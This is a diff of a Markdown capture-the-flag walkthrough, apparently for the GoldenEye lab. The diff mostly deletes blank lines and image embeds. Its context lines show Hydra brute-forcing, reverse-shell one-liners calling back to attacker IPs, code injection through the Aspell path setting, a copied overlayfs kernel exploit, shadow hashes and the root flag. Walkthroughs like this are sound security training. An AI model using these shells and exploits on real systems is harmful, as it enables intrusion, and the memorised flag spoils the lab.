@@ -286,8 +286,6 @@ InvincibleHack3r
 
 ```
 
-![[Pasted image 20230203130306.png]]
-
 First things first, connect to our [network](http://access/) and deploy the machine.
 
 Question Done
@@ -313,7 +311,6 @@ Whats their password?
 Now go use those credentials and login to a part of the site.
 
 Question Done
-
 
 ###  Its mail time...
 
@@ -504,17 +501,12 @@ And if you didn't have the URL on outr internal Domain: severnaya-station.com/gn
 
 Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
 
-
 .
 quit
 +OK Logging out.
 Connection closed by foreign host.
 
-
 ```
-
-![[Pasted image 20230203135927.png]]
-
 
 Take a look at some of the other services you found using your nmap scan. Are the credentials you have re-usable?   
 
@@ -670,7 +662,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-03 14:05:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-03 14:05:44
 
-
 doak:goat
 
 ┌──(kali㉿kali)-[~/Downloads]
@@ -719,7 +710,6 @@ http://severnaya-station.com/gnocertdir/
 http://severnaya-station.com/gnocertdir/user/files.php
 
 For James --- secret.txt
-
 
 007,
 
@@ -793,7 +783,6 @@ sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>
 let's replace it with
 https://www.revshells.com/
 
-
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 
 Spell engine : PSSpellSpell
@@ -817,12 +806,6 @@ www-data
 
 ```
 
-![[Pasted image 20230203140952.png]]
-![[Pasted image 20230203142017.png]]
-![[Pasted image 20230203142329.png]]
-![[Pasted image 20230203142530.png]]
-
-
 If you remembered in some of the emails you discovered, there is the severnaya-station.com website. To get this working, you need up update your DNS records to reveal it.
 
 If you're on Linux edit your "/etc/hosts" file and add:
@@ -842,7 +825,6 @@ Try using the credentials you found earlier. Which user can you login as?
 *xenia*
 
 Have a poke around the site. What other user can you find?
-
 
 *doak*
 
@@ -876,7 +858,6 @@ Use exiftool
 
  Completed
 
-
 Using the information you found in the last task, login with the newly found user.
 
  Completed
@@ -888,8 +869,6 @@ Take a look into Aspell, the spell checker plugin.
 Settings->Aspell->Path to aspell field, add your code to be executed. Then create a new page and "spell check it".
 
  Completed
-
-
 
 ###  Privilege Escalation
 
@@ -922,7 +901,6 @@ Saving to: 'linuxprivchecker.py'
 2023-02-03 11:29:45 (122 KB/s) - 'linuxprivchecker.py' saved [25304/25304]
 
 www-data@ubuntu:/tmp$ chmod +x linuxprivchecker.py
-
 
 www-data@ubuntu:/tmp$ python linuxprivchecker.py
 python linuxprivchecker.py
@@ -1066,7 +1044,6 @@ LINUX PRIVILEGE ESCALATION CHECKER
     -rwxr-xr-x  1 root root  771 Apr 10  2014 man-db
 
 [+] Writable cron dirs
-
 
 [*] ENUMERATING USER AND ENVIRONMENTAL INFO...
 
@@ -2878,7 +2855,6 @@ Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_6
 ---------------------------------------------- ---------------------------------
 Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.0 | linux/local/37292.c
 
-
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ searchsploit -m linux/local/37292.c 
   Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
@@ -2888,7 +2864,6 @@ Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.0 | linux/local/37292.c
  Verified: True
 File Type: C source, ASCII text, with very long lines (466)
 Copied to: /home/kali/Downloads/37292.c
-
 
                                                                                 
 ┌──(kali㉿kali)-[~/Downloads]
@@ -3184,7 +3159,6 @@ postgres:*:17645:0:99999:7:::
 natalya:$6$EYZISgHO$S/U.7HifU.96lbOkZkeGky7AsmPKEEgoP2RLmztk635uVfzuRkGrom9X6gOnoivHsnO1x2822cTsH6w2GFRWG/:17646:0:99999:7:::
 doak:$6$UrICgO36$gORwXyIypiMjPVdQa5wb1SQKcL27oNIHdjhBSGV8XX2m4F.oyRwiQOxcfUfQjPjzNL/UwcVXfNFzmKk5LEqXs1:17646:0:99999:7:::
 
-
 view-source:http://10.10.146.26/006-final/xvf7-flag/
 
 <html>
@@ -3193,11 +3167,9 @@ view-source:http://10.10.146.26/006-final/xvf7-flag/
 <link rel="stylesheet" href="index.css">
 </head>
 
-
 <video poster="val.jpg" id="bgvid" playsinline autoplay muted loop>
 
 <source src="key.webm" type="video/webm">
-
 
 </video>
 <div id="golden">
@@ -3206,7 +3178,6 @@ view-source:http://10.10.146.26/006-final/xvf7-flag/
 <p>You've captured the codes! And stopped Alec Trevelyan from his indestructible vengeance!!!!</p>
 <p>****************************************</p>
 </div>
-
 
 <script src="index.js"></script>
 </html>
@@ -3232,7 +3203,6 @@ vid.pause();
 vidFade();
 }); 
 
-
 pauseButton.addEventListener("click", function() {
   vid.classList.toggle("stopfade");
   if (vid.paused) {
@@ -3244,10 +3214,7 @@ pauseButton.addEventListener("click", function() {
   }
 })
 
-
-
 ```
-
 
 Download the [linuxprivchecker](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123) to enumerate installed development tools.
 
@@ -3297,9 +3264,6 @@ What is the root flag?
 
 ![](https://i.imgur.com/qtALFwb.gif)
 
-
 *568628e0d993b1973adc718237da6e93*
-
-![[Pasted image 20230203152938.png]]
 
 [[Holo]]
